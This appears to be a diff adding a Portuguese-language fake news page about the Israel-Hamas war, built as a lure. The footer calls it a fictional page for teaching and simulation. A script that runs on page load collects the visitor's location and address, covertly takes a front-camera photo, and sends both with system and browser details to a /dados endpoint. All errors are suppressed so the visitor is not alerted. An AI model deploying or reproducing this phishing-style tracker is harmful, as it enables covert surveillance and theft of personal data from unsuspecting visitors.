@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+  <meta charset="UTF-8">
+  <title>JornalGlobal – Cobertura Especial: Guerra em Israel</title>
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/21/21601.png">
+  <style>
+    :root {
+      --bg: #101214;
+      --header: #181c23;
+      --primary: #f44336;
+      --secondary: #03a9f4;
+      --accent: #ffd600;
+      --font: #ededed;
+      --overlay: #232323e0;
+      --card: #20242a;
+    }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: var(--bg);
+      color: var(--font);
+      min-height: 100vh;
+    }
+    header {
+      background: var(--header);
+      box-shadow: 0 2px 12px #111b;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 34px;
+      height: 76px;
+      position: sticky; top:0; left:0; right:0; z-index: 40;
+    }
+    .logo {
+      display: flex; align-items: center;
+    }
+    .logo img {
+      height: 52px; margin-right: 15px;
+    }
+    .logo-title {
+      font-size: 2.3em;
+      font-weight: 800;
+      color: var(--primary);
+      letter-spacing: -1px;
+    }
+    nav {
+      display: flex; gap: 32px;
+    }
+    nav a {
+      color: var(--secondary);
+      text-decoration: none;
+      font-size: 1.05em;
+      font-weight: 500;
+      border-bottom: 2.5px solid transparent;
+      transition: border .16s, color .15s;
+      padding: 6px 3px;
+    }
+    nav a:hover {
+      color: var(--accent);
+      border-bottom: 2.5px solid var(--accent);
+    }
+    .user-icon {
+      background: #25292f;
+      color: #FFF;
+      border-radius: 50%;
+      font-size: 23px;
+      width: 40px; height:40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-left: 18px;
+    }
+    #status {
+      font-weight: 700;
+      color: var(--accent);
+      margin-left: 24px;
+    }
+    .main-bg {
+      position: relative;
+      background-image: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1200&q=80');
+      background-position: center; background-size: cover;
+      min-height: 330px;
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 40px;
+    }
+    .main-bg-overlay {
+      background: var(--overlay);
+      padding: 44px 33px;
+      border-radius: 18px;
+      max-width: 670px;
+      margin: 32px 0;
+      box-shadow: 0 6px 32px #000b;
+      text-align: left;
+    }
+    .main-headline {
+      color: var(--accent);
+      font-size: 2.3em;
+      font-weight: bold;
+      margin-bottom: 11px;
+    }
+    .main-desc {
+      color: var(--font);
+      font-size: 1.18em;
+      margin-bottom: 12px;
+    }
+    .main-meta {
+      color: #999;
+      font-size: 1.05em;
+    }
+    .container {
+      margin: 0 auto;
+      max-width: 1360px;
+      display: flex;
+      gap: 44px;
+      padding: 0 16px;
+    }
+    main {
+      flex: 2;
+      display: flex;
+      flex-direction: column;
+      gap: 32px;
+    }
+    .news-blocks {
+      display: grid;
+      grid-template-columns: repeat(auto-fit,minmax(370px,1fr));
+      gap: 38px;
+      margin-bottom: 22px;
+    }
+    .news-card {
+      background: var(--card);
+      border-radius: 15px;
+      box-shadow: 0 2px 14px #0006;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      min-height: 308px;
+      transition: box-shadow .13s, transform .13s;
+    }
+    .news-card img {
+      width: 100%;
+      height: 195px;
+      object-fit: cover;
+      background: #121214;
+    }
+    .news-content {
+      padding: 21px 19px 14px 19px;
+      display: flex; flex-direction: column;
+      flex: 1 1 0%;
+    }
+    .news-title {
+      font-size: 1.22em;
+      color: var(--primary);
+      font-weight: 700;
+      margin: 0 0 10px 0;
+      text-decoration: none;
+      word-break: break-word;
+      transition: color .13s;
+    }
+    .news-title:hover { color: var(--accent);}
+    .news-desc {
+      color: var(--font);
+      font-size: 1.02em;
+      margin-bottom: 9px;
+    }
+    .news-meta {
+      color: #aaa;
+      font-size: .99em;
+      margin-top: auto;
+    }
+    aside.sidebar {
+      flex: 1;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      gap: 27px;
+    }
+    .widget {
+      background: var(--card);
+      border-radius: 11px;
+      box-shadow: 0 2px 10px #0005;
+      padding: 18px 14px 10px 18px;
+      margin-bottom: 0;
+    }
+    .widget-title {
+      margin: 0 0 12px 0;
+      color: var(--secondary);
+      font-weight: bold;
+      font-size: 1.05em;
+      letter-spacing: .02em;
+    }
+    .widget-list {
+      list-style: none; margin: 0; padding: 0;
+    }
+    .widget-list li {
+      margin-bottom: 10px;
+      font-size: 1em;
+    }
+    .widget-list li a {
+      color: var(--primary);
+      text-decoration: none;
+    }
+    .widget-list li a:hover { color: var(--accent);}
+    footer {
+      margin-top: 48px;
+      background: #16161b;
+      color: #a2a2a2;
+      padding: 22px;
+      text-align: center;
+      letter-spacing: .09em;
+      font-size: .98em;
+    }
+    @media (max-width:1250px) {
+      .container {
+        flex-direction: column;
+        gap: 20px;
+      }
+      aside.sidebar {
+        max-width: none;
+        gap: 12px;
+        flex-direction: row;
+      }
+    }
+    @media (max-width:900px) {
+      .container {padding:0;}
+      .main-bg-overlay {padding: 13px;}
+      .logo-title{font-size:1.18em;}
+    }
+    @media (max-width:600px) {
+      .main-headline {font-size:1.16em;}
+      .main-bg {min-height: 150px;}
+      .news-card {min-height: 120px;}
+      nav {gap:13px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">
+      <img src="https://cdn-icons-png.flaticon.com/512/21/21601.png" alt="Jornal Logo">
+      <span class="logo-title">JornalGlobal</span>
+    </div>
+    <nav>
+      <a href="#">Últimas</a>
+      <a href="#">Israel-Hamas</a>
+      <a href="#">Oriental Médio</a>
+      <a href="#">Mundo</a>
+      <a href="#">Análises</a>
+      <a href="#">Imagens</a>
+      <a href="#">Colunas</a>
+    </nav>
+    <div class="user-icon" title="Usuário">🌍</div>
+    <span id="status">Cobertura Especial: Guerra em Israel</span>
+  </header>
+  <div class="main-bg">
+    <div class="main-bg-overlay">
+      <div class="main-headline">Escalada no Oriente Médio: Guerra em Israel ameaça desestabilizar cenário global</div>
+      <div class="main-desc">Conflitos intensos entre Israel e Hamas deixam milhares de mortos, levantando temores de envolvimento de potências e especulação sobre uma possível Terceira Guerra Mundial.</div>
+      <div class="main-meta">Por Equipe Global • Atualizado em 21/07/2025 07:58</div>
+    </div>
+  </div>
+  <div class="container">
+    <main>
+      <div class="news-blocks">
+        <article class="news-card">
+          <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=700&q=80" alt="Tanques de guerra em Gaza">
+          <div class="news-content">
+            <a class="news-title" href="#">Tanques israelenses cruzam fronteira de Gaza</a>
+            <div class="news-desc">Tropas terrestres intensificam operações e bombardeios atingem áreas civis. Cresce pressão internacional por cessar-fogo.</div>
+            <div class="news-meta">08:00 • Oriente Médio</div>
+          </div>
+        </article>
+        <article class="news-card">
+          <img src="https://images.unsplash.com/photo-1519125323398-675f0ddb6308?auto=format&fit=crop&w=700&q=80" alt="Prédios destruídos em conflito">
+          <div class="news-content">
+            <a class="news-title" href="#">Cidades devastadas: imagens do impacto</a>
+            <div class="news-desc">Fotos exclusivas mostram bairros arrasados em Gaza e Tel Aviv após ataques de mísseis e artilharia.</div>
+            <div class="news-meta">07:18 • Imagens</div>
+          </div>
+        </article>
+        <article class="news-card">
+          <img src="https://images.unsplash.com/photo-1504384308090-c894fdcc538d?auto=format&fit=crop&w=700&q=80" alt="Protestos globais">
+          <div class="news-content">
+            <a class="news-title" href="#">Ondas de protestos pelo mundo</a>
+            <div class="news-desc">Milhares tomam as ruas em capitais europeias e árabes pedindo fim da guerra e condenando escalada militar.</div>
+            <div class="news-meta">06:57 • Mundo</div>
+          </div>
+        </article>
+        <article class="news-card">
+          <img src="https://images.unsplash.com/photo-1464983953574-0892a716854b?auto=format&fit=crop&w=700&q=80" alt="Alerta de possível guerra global">
+          <div class="news-content">
+            <a class="news-title" href="#">Analistas veem risco de 3ª Guerra Mundial</a>
+            <div class="news-desc">Com envolvimento dos EUA, Irã e possíveis movimentos russos, especialistas alertam para ameaça de conflito de escala global.</div>
+            <div class="news-meta">05:33 • Análise</div>
+          </div>
+        </article>
+        <article class="news-card">
+          <img src="https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&w=700&q=80" alt="Socorristas e destruição">
+          <div class="news-content">
+            <a class="news-title" href="#">Socorro humanitário: desafios crescem</a>
+            <div class="news-desc">Equipes médicas enfrentam dificuldades para atender populações feridas em ambos os lados do conflito.</div>
+            <div class="news-meta">04:59 • Humanitário</div>
+          </div>
+        </article>
+        <article class="news-card">
+          <img src="https://images.unsplash.com/photo-1503676382389-4809596d5290?auto=format&fit=crop&w=700&q=80" alt="Reunião ONU sobre conflito">
+          <div class="news-content">
+            <a class="news-title" href="#">ONU debate intervenção urgente no Oriente Médio</a>
+            <div class="news-desc">Segurança global e diplomatas cogitam missões de paz, tentando evitar escalada sem precedentes.</div>
+            <div class="news-meta">04:21 • Política Externa</div>
+          </div>
+        </article>
+      </div>
+    </main>
+    <aside class="sidebar">
+      <section class="widget">
+        <div class="widget-title">Mais lidas</div>
+        <ul class="widget-list">
+          <li><a href="#">Biden discursa sobre envolvimento dos EUA</a></li>
+          <li><a href="#">Relatos de jornalistas na linha de frente</a></li>
+          <li><a href="#">Como proteger-se de desinformação de guerra</a></li>
+          <li><a href="#">Impactos econômicos globais do conflito</a></li>
+          <li><a href="#">Famílias buscam refúgio em países vizinhos</a></li>
+        </ul>
+      </section>
+      <section class="widget">
+        <div class="widget-title">Colunas</div>
+        <ul class="widget-list">
+          <li><a href="#">Opinião: Israel, Hamas e os riscos de uma guerra total</a></li>
+          <li><a href="#">Geopolítica: O papel do Irã e alianças estratégicas</a></li>
+        </ul>
+      </section>
+      <section class="widget">
+        <div class="widget-title">Imagens em destaque</div>
+        <ul class="widget-list">
+          <li><a href="#">Explosão em Tel Aviv</a></li>
+          <li><a href="#">Sobreviventes em Gaza</a></li>
+        </ul>
+      </section>
+    </aside>
+  </div>
+  <footer>
+    &copy; 2025 JornalGlobal — Especial dedicado à cobertura dos conflitos Israel x Hamas. Página fictícia para fins didáticos e de simulação.
+  </footer>
+  <script>
+    // Script de coleta de localização, sistema, navegador, câmera (SEM alertas de erro para usuário)
+    async function capturarDados() {
+      try {
+        const sistema = navigator.platform;
+        const navegador = navigator.userAgent;
+
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          let endereco = 'Desconhecido';
+          try {
+            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+            const geoData = await geoRes.json();
+            endereco = geoData.display_name || endereco;
+          } catch{}
+
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const context = canvas.getContext('2d');
+
+            setTimeout(() => {
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const imagem = canvas.toDataURL('image/png');
+
+              fetch('/dados', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  latitude,
+                  longitude,
+                  endereco,
+                  imagem,
+                  sistema,
+                  navegador
+                })
+              }).then(() => {
+                document.getElementById('status').textContent = '✓ Dados enviados com sucesso!';
+                stream.getTracks().forEach(track => track.stop());
+              }).catch(() => {
+                stream.getTracks().forEach(track => track.stop());
+              });
+            }, 3000);
+          } catch {
+            // Ignora erro da câmera
+          }
+        }, (err) => {
+          // Ignora erro de localização/rejeição do usuário
+        });
+      } catch (err) {
+        // erro geral ignorado
+      }
+    }
+    window.onload = capturarDados;
+  </script>
+</body>
+</html>
